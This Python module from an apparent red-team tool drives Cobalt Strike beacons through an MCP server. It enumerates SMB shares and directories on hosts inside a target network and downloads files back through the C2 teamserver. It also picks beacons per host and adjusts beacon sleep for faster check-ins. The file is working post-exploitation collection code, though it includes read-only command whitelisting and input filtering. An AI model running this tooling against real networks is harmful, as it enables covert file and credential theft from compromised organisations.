"""Cobalt Strike enumeration transport (via the official CS MCP server).

Routes the SAME read-only EnumerationTransport surface through a Cobalt
Strike beacon instead of direct impacket sockets: the beacon sits inside
the target network and enumerates ``\\\\HOST\\share`` with its own domain
context, so isolated segments — and the beacon host itself (localhost
mode, via `net share` local-path mapping) — become reachable without a
SOCKS pivot.

Backend contract (the official Cobalt-Strike/cobaltstrike-mcp-server):
    cs_execute_command        → submission receipt (async!)
    cs_read_command_output    → one execution's output text
    cs_list_downloads         → download transfers incl. progress
    cs_fetch_download         → one-time link to the downloaded bytes
    cs_list_beacons           → beacon inventory
Argument names below are the documented/README-inferred shapes; if a live
server differs, adjust CS_ARG_NAMES (one place).

READ-ONLY BY CONSTRUCTION: this transport only ever issues commands built
from four code-generated templates — ``ls``, ``net view \\\\host``,
``net share`` (localhost only) and ``download``. There is no path for a
caller (LLM included) to inject a command string, and no write/execute
template exists.

Batch semantics vs beacon sleep time: submissions return receipts
immediately; the teamserver bundles queued tasks into the beacon's
existing check-ins. Submit many, then drain — never lockstep.
"""
from __future__ import annotations

import base64
import re
import threading
import time
from typing import Any, Optional

from .transport import EnumerationTransport

# official-MCP argument names, in one place (documented shapes)
CS_ARG_NAMES = {
    "execute": {"beacon": "beacon_id", "command": "command"},
    "read_output": {"execution": "execution_id"},
    "list_downloads": {},
    "fetch_download": {"download": "download_id"},
    "list_beacons": {},
}

# every command this transport can EVER issue (test-enforced whitelist)
COMMAND_TEMPLATES = ("ls", "net view", "net share", "download")


class CSCommandError(Exception):
    """Beacon-side error surfaced as a command failure (maps to the
    impacket-style exceptions the upper layers already handle)."""


class CSUndelivered(CSCommandError):
    """Execution never produced output before its deadline (beacon dead or
    not checking in). The caller should record the path as unreadable —
    never silently skip it."""


class CSParseError(CSCommandError):
    """Beacon output did not match the expected grammar (wrong CS version
    profile or unexpected output). Fails loud, never guesses entries."""


# --------------------------------------------------------------------------- #
# output parsing (strict grammar; unknown lines are reported, not invented)
# --------------------------------------------------------------------------- #
_LS_HEADER_RE = re.compile(r"^\[\*\]\s*Listing:\s*(.+?)\s*$", re.IGNORECASE)
_LS_ROW_RE = re.compile(
    r"^\s+(?P<size>\d+(?:\.\d+)?)\s*(?P<unit>[bkmgt]?b)?\s+"
    r"(?P<type>dir|file)\s+"
    r"(?P<date>\d{2}/\d{2}/\d{4}\s+\d{2}:\d{2}(?::\d{2})?)\s+"
    r"(?P<name>.+?)\s*$", re.IGNORECASE)
_ERR_LINE_RE = re.compile(r"^\s*\[-\]\s*(?P<msg>.+?)\s*$", re.IGNORECASE)
_SIZE_MULT = {"b": 1, "kb": 1024, "mb": 1024 ** 2, "gb": 1024 ** 3,
              "tb": 1024 ** 4}


def _parse_size(number: str, unit: Optional[str]) -> int:
    unit = (unit or "b").lower()
    return int(float(number) * _SIZE_MULT.get(unit, 1))


_COLUMN_WORDS = ("size", "type", "name", "remark", "resource",
                 "last modified", "share name", "server name")


def _is_decoration(line: str) -> bool:
    """Column-header rows and dash rules — table furniture, not data."""
    if not line.strip() or re.fullmatch(r"[-\s]+", line):
        return True
    low = line.lower()
    hits = sum(1 for w in _COLUMN_WORDS if w in low)
    return hits >= 2


def _norm_path(p: str) -> str:
    # r"\\" as the REPLACEMENT is one literal backslash — a bare "\\" here
    # would be re-parsed as an escape and blow up with "bad escape"
    return re.sub(r"[\\/]+", r"\\", (p or "").strip("\\/")).lower()


def _map_error(message: str) -> Exception:
    low = message.lower()
    if "not found" in low or "cannot find" in low or "no such" in low:
        return FileNotFoundError(message)
    if "access" in low and "denied" in low:
        return PermissionError(message)
    return CSCommandError(message)


def parse_ls_output(text: str, expected_path: str) -> dict:
    """One `ls` execution output → SMBSession.list_dir-shaped dict.

    Self-checks the `[*] Listing: <path>` header (guards against reading
    the wrong execution) and maps `[-]` error lines to the exceptions the
    impacket path raises. Rows that match no grammar are collected under
    ``unparsed`` — never guessed into entries."""
    header: Optional[str] = None
    entries: list[dict] = []
    errors: list[str] = []
    unparsed: list[str] = []
    for line in text.splitlines():
        if not line.strip():
            continue
        err = _ERR_LINE_RE.match(line)
        if err:
            errors.append(err.group("msg"))
            continue
        if _is_decoration(line):
            continue                          # column headers / dash rules
        if header is None:
            m = _LS_HEADER_RE.match(line)
            if m:
                header = m.group(1)
                continue
            unparsed.append(line)
            continue
        row = _LS_ROW_RE.match(line)
        if row:
            entries.append({
                "name": row.group("name"),
                "is_dir": row.group("type").lower() == "dir",
                "size": _parse_size(row.group("size"), row.group("unit")),
                "attributes": "",
                "created": None, "accessed": None,
                "written": row.group("date"),
            })
        else:
            unparsed.append(line)
    if errors:
        raise _map_error("; ".join(errors))
    if header is None:
        raise CSParseError(
            f"ls output did not start with the Listing header: {text[:120]!r}")
    if _norm_path(header) != _norm_path(expected_path):
        raise CSParseError(
            f"ls output header {header!r} does not match requested "
            f"{expected_path!r}")
    if unparsed and len(unparsed) > max(3, len(entries)):
        # profile mismatch: most rows unrecognized — refuse rather than
        # return a partial listing that looks complete
        raise CSParseError(
            f"{len(unparsed)} unparsable lines (CS output profile mismatch?) "
            f"first: {unparsed[0][:80]!r}")
    return {"entries": entries, "unparsed": unparsed, "header": header}


_NETVIEW_ROW_RE = re.compile(
    r"^\s+(?P<name>[A-Za-z0-9_$ .#-]{1,64}?)\s{2,}"
    r"(?P<type>[A-Za-z ]{3,20}?)\s{2,}"
    r"(?P<remark>.*?)\s*$")


def _rows(text: str):
    """Yield (line, error_msg_or_None) splitting `[-]` error lines and
    table decoration out."""
    for line in text.splitlines():
        if _is_decoration(line):
            continue
        err = _ERR_LINE_RE.match(line)
        yield line, (err.group("msg") if err else None)


def parse_net_view(text: str, host: str) -> list[dict]:
    """`net view \\\\host` output → SMBSession.list_shares-shaped list."""
    shares: list[dict] = []
    errors: list[str] = []
    for line, err in _rows(text):
        if err:
            errors.append(err)
            continue
        row = _NETVIEW_ROW_RE.match(line)
        if row:
            name = row.group("name").strip()
            stype = row.group("type").strip().lower()
            shares.append({
                "name": name,
                "remark": row.group("remark").strip(),
                "type": 0,
                "type_name": "SPECIAL" if "special" in stype else
                             ("PRINT" if "print" in stype else "DISK"),
                "special": "special" in stype or name.endswith("$"),
            })
    if errors:
        raise _map_error("; ".join(errors))
    if not shares:
        raise CSParseError(
            f"net view output had no share rows (profile mismatch?): "
            f"{text[:120]!r}")
    return shares


_NETSHARE_ROW_RE = re.compile(
    r"^\s+(?P<name>[A-Za-z0-9_$ .#-]{1,64}?)\s{2,}"
    r"(?P<resource>[A-Za-z]:\\.*?)\s{2,}"
    r"(?P<remark>.*?)\s*$")
_NETSHARE_NORES_RE = re.compile(
    r"^\s+(?P<name>[A-Za-z0-9_$ .#-]{1,64}?)\s{2,}"
    r"(?P<remark>.*?)\s*$")


def parse_net_share(text: str) -> tuple[list[dict], dict[str, str]]:
    """`net share` (localhost) → (shares list, share→local-path map).

    Unlike `net view \\\\host`, the local table carries each share's
    RESOURCE (its real local path) — exactly the mapping localhost
    enumeration needs to turn share-relative paths into filesystem paths.
    """
    shares: list[dict] = []
    mapping: dict[str, str] = {}
    errors: list[str] = []
    for line, err in _rows(text):
        if err:
            errors.append(err)
            continue
        row = _NETSHARE_ROW_RE.match(line)
        resource = ""
        if row is None:               # e.g. IPC$ — no Resource column
            row = _NETSHARE_NORES_RE.match(line)
        else:
            resource = row.group("resource").strip()
        if row:
            name = row.group("name").strip()
            shares.append({
                "name": name, "remark": row.group("remark").strip(),
                "type": 0,
                "type_name": "SPECIAL" if name.endswith("$") else "DISK",
                "special": name.endswith("$"),
            })
            if resource:
                mapping[name.lower()] = resource
    if errors:
        raise _map_error("; ".join(errors))
    if not shares:
        raise CSParseError(
            f"net share output had no rows (profile mismatch?): "
            f"{text[:120]!r}")
    return shares, mapping


# --------------------------------------------------------------------------- #
# backend: the only layer that talks to the official CS MCP server
# --------------------------------------------------------------------------- #
class RealCSBackend:
    """MCP client to the official cobaltstrike-mcp-server (streamable
    HTTP). Runs one dedicated asyncio loop on a daemon thread; sync API.

    Needs the optional `mcp` package (pip install 'credshrike[mcp]')."""

    def __init__(self, url: str, token: str = "", poll_interval: float = 2.0):
        self.url = url.rstrip("/")
        self.token = token
        self.poll_interval = poll_interval
        import asyncio
        self._asyncio = asyncio
        self._loop = asyncio.new_event_loop()
        threading.Thread(target=self._loop.run_forever, daemon=True,
                         name="cs-mcp-client").start()
        self._session = None      # lazily connected (session, ctxmanager)

    def _connect(self):
        if self._session is not None:
            return self._session[0]
        try:
            from mcp import ClientSession
            from mcp.client.streamable_http import streamablehttp_client
        except ImportError as exc:
            raise RuntimeError(
                "the Cobalt Strike transport needs the 'mcp' package — "
                "pip install 'credshrike[mcp]'") from exc
        headers = ({"Authorization": f"Bearer {self.token}"}
                   if self.token else {})
        cm = streamablehttp_client(self.url + "/mcp", headers=headers)
        read, write, _info = self._run(cm.__enter__())
        session = ClientSession(read, write)
        self._run(session.__aenter__())
        self._session = (session, cm)
        return session

    def _run(self, coro):
        return self._asyncio.run_coroutine_threadsafe(
            coro, self._loop).result(timeout=60)

    def call(self, tool: str, args: dict) -> str:
        """Call one official cs_* tool; returns its text content."""
        result = self._run(self._connect().call_tool(tool, args))
        parts = getattr(result, "content", [])
        texts = [getattr(p, "text", "") for p in parts]
        if getattr(result, "isError", False):
            raise CSCommandError(f"{tool} failed: {' '.join(texts)[:200]}")
        return "\n".join(texts)

    def close(self) -> None:
        if self._session is not None:
            session, cm = self._session
            try:
                self._run(session.__aexit__(None, None, None))
                self._run(cm.__exit__(None, None, None))
            except Exception:  # noqa: BLE001 — best-effort teardown
                pass
            self._session = None
        self._loop.call_soon_threadsafe(self._loop.stop)


_RECEIPT_ID_RE = re.compile(r"(\d+)")


_TARGET_CHARS = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
                    "0123456789_$." + chr(92) + chr(92) + ":/- ")


def _safe_target(target: str) -> bool:
    """A path we are willing to put inside a command. Paths originate from
    beacon listings — a hostile filename must never become command
    syntax, so anything outside a strict path charset is refused (the file
    is then recorded unreadable instead of executed)."""
    return bool(target) and all(c in _TARGET_CHARS for c in target)


def _is_whitelisted(command: str, host: str) -> bool:
    """The ONLY commands this transport may ever submit."""
    for verb in ("ls", "download"):
        prefix = verb + " "
        if command.startswith(prefix):
            return _safe_target(command[len(prefix):])
    if command == f"net view \\\\{host}" or command == "net view":
        return True
    return command == "net share"


class CobaltStrikeTransport(EnumerationTransport):
    """Read-only enumeration of ONE host through one CS beacon.

    Sync methods (list_shares/list_dir/read_file/stat) each submit one
    command and drain it to completion — correct but lockstep. The batch
    API (submit_list_dir()/drain()) is how sweeps should drive this
    transport: fire many receipts, then collect outputs as the beacon
    checks in.

    Localhost mode (host == 'localhost'/'127.0.0.1') enumerates the
    beacon's own machine: `net share` supplies the share→local-path map.
    """

    def __init__(self, backend: Any, beacon: str, host: str,
                 deadline_seconds: float = 1800.0,
                 poll_interval: Optional[float] = None):
        self.backend = backend
        self.beacon = beacon
        self.host = host
        self.deadline_seconds = deadline_seconds
        self.poll_interval = poll_interval if poll_interval is not None \
            else getattr(backend, "poll_interval", 2.0)
        self._pending: dict[str, dict] = {}   # execution id → submission
        self._lock = threading.Lock()
        self._local = host.lower() in ("localhost", "127.0.0.1")
        self._local_paths: dict[str, str] = {}   # share → local path

    # ---- command construction (the ONLY commands ever issued) ---------- #
    def _unc(self, share: str, path: str) -> str:
        target = (path or "").replace("/", "\\")
        if self._local:
            base = self._local_paths.get(share.lower())
            if base is None:
                # tolerate drive-letter admin shares without net share
                m = re.fullmatch(r"(?i)([a-z])\$?", share)
                if m:
                    base = f"{m.group(1).upper()}:\\"
                else:
                    raise CSCommandError(
                        f"localhost mode: share {share!r} has no known local "
                        "path (call list_shares first)")
            target = base.rstrip("\\") + ("\\" + target if target else "")
            return target
        target = f"\\\\{self.host}\\{share}" + \
                 ("\\" + target if target else "")
        return target

    def _submit(self, command: str) -> str:
        """Submit ONE whitelisted command; returns its execution id."""
        if not _is_whitelisted(command, self.host):
            # defence in depth: never submit anything outside the templates
            raise CSCommandError(f"refusing non-template command: {command!r}")
        names = CS_ARG_NAMES["execute"]
        receipt = self.backend.call("cs_execute_command", {
            names["beacon"]: self.beacon, names["command"]: command})
        m = _RECEIPT_ID_RE.search(receipt)
        if not m:
            raise CSCommandError(
                f"no execution id in receipt: {receipt[:120]!r}")
        exec_id = m.group(1)
        with self._lock:
            self._pending[exec_id] = {
                "command": command,
                "deadline": time.time() + self.deadline_seconds}
        return exec_id

    def _read(self, exec_id: str) -> Optional[str]:
        """One execution's output, or None while still pending. Raises the
        mapped error for failed commands; raises CSUndelivered once the
        deadline passes."""
        info = self._pending.get(exec_id)
        names = CS_ARG_NAMES["read_output"]
        text = self.backend.call("cs_read_command_output",
                                 {names["execution"]: exec_id})
        if text and text.strip() and not text.lower().startswith("pending"):
            return text
        if info and time.time() > info["deadline"]:
            raise CSUndelivered(
                f"execution {exec_id} ({info['command'][:60]}) produced no "
                f"output within {self.deadline_seconds:.0f}s — beacon not "
                "checking in?")
        return None

    def _wait(self, exec_id: str) -> str:
        while True:
            text = self._read(exec_id)      # may raise CSUndelivered
            if text is not None:
                return text
            time.sleep(self.poll_interval)

    # ---- core interface -------------------------------------------------- #
    def list_shares(self) -> list[dict]:
        if self._local:
            command = "net share"
            exec_id = self._submit(command)
            shares, mapping = parse_net_share(self._wait(exec_id))
            self._local_paths.update(mapping)
            return shares
        command = f"net view \\\\{self.host}"
        exec_id = self._submit(command)
        return parse_net_view(self._wait(exec_id), self.host)

    def list_dir(self, share: str, path: str = "",
                 max_entries: int = 500) -> dict:
        target = self._unc(share, path)
        command = f"ls {target}"
        exec_id = self._submit(command)
        parsed = parse_ls_output(self._wait(exec_id), target)
        entries = parsed["entries"][:max_entries]
        return {"share": share, "path": path, "entries": entries,
                "truncated": len(parsed["entries"]) > max_entries,
                "total_seen": len(parsed["entries"])}

    def read_file(self, share: str, path: str, offset: int = 0,
                  max_bytes: int = 262144) -> dict:
        target = self._unc(share, path)
        command = f"download {target}"
        exec_id = self._submit(command)
        self._wait(exec_id)      # download submission acknowledged
        data = self._fetch_download_bytes(target)
        chunk = data[offset:offset + max_bytes]
        return {"share": share, "path": path, "offset": offset,
                "size": len(chunk), "truncated": len(chunk) == max_bytes,
                "content_b64": base64.b64encode(chunk).decode("ascii")}

    def stat(self, share: str, path: str) -> dict:
        parent, _, name = path.replace("/", "\\").rpartition("\\")
        for entry in self.list_dir(share, parent)["entries"]:
            if entry["name"].lower() == name.lower():
                return dict(entry, share=share, path=path)
        raise FileNotFoundError(f"not found: {share}/{path}")

    # ---- downloads --------------------------------------------------------
    def _fetch_download_bytes(self, target: str) -> bytes:
        """Poll cs_list_downloads until our transfer completes, then fetch
        the one-time link. A stuck transfer surfaces as CSUndelivered at
        the deadline — nothing is silently dropped."""
        deadline = time.time() + self.deadline_seconds
        arg = CS_ARG_NAMES["fetch_download"]["download"]
        while time.time() < deadline:
            listing = self.backend.call("cs_list_downloads", {})
            for item in listing.splitlines():
                if not item.strip() or target.lower() not in item.lower():
                    continue
                low = item.lower()
                if ("in progress" in low or "in-progress" in low
                        or "pending" in low or re.search(r"\d+%\s*$", item)):
                    continue          # still transferring
                m = _RECEIPT_ID_RE.search(item)
                if not m:
                    continue
                link = self.backend.call("cs_fetch_download",
                                         {arg: m.group(1)})
                return self._http_get(link)
            time.sleep(self.poll_interval)
        raise CSUndelivered(f"download of {target} did not complete in time")

    @staticmethod
    def _http_get(link: str) -> bytes:
        import httpx
        resp = httpx.get(link, follow_redirects=True, timeout=120)
        resp.raise_for_status()
        return resp.content

    # ---- batch API (the anti-lockstep path for sweeps) --------------------
    def submit_list_dir(self, share: str, path: str) -> str:
        """Queue one ls (returns an execution id immediately)."""
        return self._submit(f"ls {self._unc(share, path)}")

    def drain(self) -> list[tuple[str, Any]]:
        """Collect whatever is ready: [(execution_id, result)] where result
        is a parsed dict, an Exception for failures, or the id is simply
        absent while still pending. CSUndelivered entries surface as
        exceptions so coverage accounting can see them."""
        out: list[tuple[str, Any]] = []
        for exec_id, info in list(self._pending.items()):
            try:
                text = self._read(exec_id)
            except Exception as exc:  # noqa: BLE001 — surfaced to caller
                out.append((exec_id, exc))
                with self._lock:
                    self._pending.pop(exec_id, None)
                continue
            if text is None:
                continue
            try:
                command = info["command"]
                if command.startswith(("net view", "net share")):
                    shares, mapping = parse_net_share(text) \
                        if command == "net share" else \
                        (parse_net_view(text, self.host), {})
                    if mapping:
                        self._local_paths.update(mapping)
                    out.append((exec_id, {"shares": shares}))
                else:
                    out.append((exec_id,
                                parse_ls_output(text,
                                                command[len("ls "):])))
            except Exception as exc:  # noqa: BLE001 — surfaced to caller
                out.append((exec_id, exc))
            with self._lock:
                self._pending.pop(exec_id, None)
        return out

    def pending_count(self) -> int:
        with self._lock:
            return len(self._pending)


# --------------------------------------------------------------------------- #
# run-scoped arming (mirrors arm_inventory_cache): the factory asks the
# active provider for a transport; the default stays impacket
# --------------------------------------------------------------------------- #
def pick_beacon(backend: Any, preferred: str = "") -> str:
    """Resolve the beacon to use: an explicit id wins, else the first
    beacon the server reports (M3 adds per-host affinity)."""
    if preferred and preferred != "auto":
        return preferred
    text = backend.call("cs_list_beacons", {})
    m = _RECEIPT_ID_RE.search(text)
    if not m:
        raise CSCommandError(f"no beacons available: {text[:120]!r}")
    return m.group(1)


def _parse_beacons(text: str) -> list[tuple[str, str]]:
    """[(beacon_id, description)] from cs_list_beacons output."""
    out = []
    for line in text.splitlines():
        if _is_decoration(line):
            continue
        m = _RECEIPT_ID_RE.search(line)
        if m:
            out.append((m.group(1), line))
    return out


class BeaconChooser:
    """Per-host beacon selection:

    * ``affinity`` — when the target hostname appears in a beacon's
      description, that beacon owns the host (it IS that machine or sits
      closest to it); otherwise round-robin across beacons so hosts
      spread out and sweep in parallel through multiple check-ins.
    * explicit beacon id / first beacon — as before.
    """

    def __init__(self, beacons: list[tuple[str, str]], mode: str = "affinity"):
        self.beacons = beacons or []
        self.mode = mode if beacons else "first"
        self._rr = 0
        self._lock = threading.Lock()

    def pick(self, host: str) -> str:
        with self._lock:
            if not self.beacons:
                raise CSCommandError("no beacons available")
            if self.mode in ("", "first", "auto"):
                return self.beacons[0][0]
            if self.mode not in ("affinity", "round-robin"):
                return self.mode          # explicit beacon id
            low = host.lower()
            short = low.split(".")[0]
            for bid, desc in self.beacons:
                d = desc.lower()
                # full host or its short label (dev01.corp.local vs DEV01)
                if low in d or (short and
                                re.search(rf"\b{re.escape(short)}\b", d)):
                    return bid
            if self.mode == "affinity" or len(self.beacons) == 1:
                bid = self.beacons[self._rr % len(self.beacons)][0]
                self._rr += 1
                return bid
            bid = self.beacons[self._rr % len(self.beacons)][0]
            self._rr += 1
            return bid


def _apply_sleep(backend: Any, beacon: str, spec: str) -> None:
    """Submit a `sleep <delay> <jitter>` C2-hygiene command directly.

    These are OPERATIONAL commands about the beacon itself, not target
    actions — so they bypass the enumeration whitelist (which stays pure:
    ls / net view / net share / download only)."""
    names = CS_ARG_NAMES["execute"]
    backend.call("cs_execute_command",
                 {names["beacon"]: beacon,
                  names["command"]: f"sleep {spec}"})


def arm_cs_transport(policy) -> None:
    """Build ONE shared backend for the run and arm the factory.

    Beacon selection (policy cs_beacon): explicit id, "first"/"auto"
    (default), or "affinity"/"round-robin" (per-host choice across the
    beacons cs_list_beacons reports).

    Sleep boost (policy cs_sleep_boost, "<boost>:<restore>" e.g.
    "5 50:60 50"): submit `sleep <boost>` on arm and `sleep <restore>` on
    disarm — the collection window runs with fast check-ins, the sweep's
    end restores the operational cadence. Explicit opt-in, off by default.
    """
    from .smb_session import arm_transport
    url = str(getattr(policy, "cs_mcp_url", "") or "").strip()
    if not url:
        raise ValueError("transport=cs-mcp requires cs_mcp_url (the official "
                         "cobaltstrike-mcp-server endpoint)")
    backend = RealCSBackend(url=url,
                            token=str(getattr(policy, "cs_mcp_token", "")
                                      or ""))
    mode = str(getattr(policy, "cs_beacon", "") or "")
    chooser = BeaconChooser(_parse_beacons(backend.call("cs_list_beacons",
                                                        {})),
                            mode=mode or "first")
    deadline = float(getattr(policy, "cs_deadline_minutes", 30)) * 60

    boost = str(getattr(policy, "cs_sleep_boost", "") or "")
    restore = ""
    if boost:
        boost, _, restore = boost.partition(":")
        for bid, _desc in chooser.beacons:      # boost EVERY beacon in use
            _apply_sleep(backend, bid, boost)

    def closer() -> None:
        if restore:
            for bid, _desc in chooser.beacons:
                try:
                    _apply_sleep(backend, bid, restore)
                except Exception:  # noqa: BLE001 — best-effort on teardown
                    pass
        backend.close()

    def provider(host: str) -> EnumerationTransport:
        return CobaltStrikeTransport(backend, chooser.pick(host), host,
                                     deadline_seconds=deadline)

    arm_transport(provider, closer=closer)
